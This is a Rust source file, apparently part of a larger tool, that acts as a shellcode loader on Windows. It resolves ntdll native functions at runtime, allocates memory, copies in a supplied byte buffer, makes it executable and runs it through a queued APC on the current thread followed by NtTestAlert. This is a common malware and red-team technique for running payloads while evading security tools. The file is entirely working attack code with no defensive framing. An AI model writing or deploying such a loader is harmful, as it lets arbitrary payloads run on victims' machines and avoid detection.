use std::ffi::c_void;
use std::ptr;
use crate::ntapi::*;

pub fn run(sc: &[u8]) -> bool {
    unsafe {
        let alloc: NtAllocateVirtualMemoryFn = std::mem::transmute(resolve(b"ntdll.dll\0", b"NtAllocateVirtualMemory\0"));
        let protect: NtProtectVirtualMemoryFn = std::mem::transmute(resolve(b"ntdll.dll\0", b"NtProtectVirtualMemory\0"));
        let queue_apc: NtQueueApcThreadFn = std::mem::transmute(resolve(b"ntdll.dll\0", b"NtQueueApcThread\0"));
        let test_alert: NtTestAlertFn = std::mem::transmute(resolve(b"ntdll.dll\0", b"NtTestAlert\0"));

        let mut base: *mut c_void = ptr::null_mut();
        let mut sz = sc.len();

        let status = alloc(CURRENT_PROCESS, &mut base, 0, &mut sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !nt_success(status) {
            return false;
        }

        ptr::copy_nonoverlapping(sc.as_ptr(), base as *mut u8, sc.len());

        let mut old_prot: u32 = 0;
        sz = sc.len();
        protect(CURRENT_PROCESS, &mut base, &mut sz, PAGE_EXECUTE_READ, &mut old_prot);

        queue_apc(CURRENT_THREAD, base, ptr::null(), ptr::null(), ptr::null());
        test_alert();
        true
    }
}
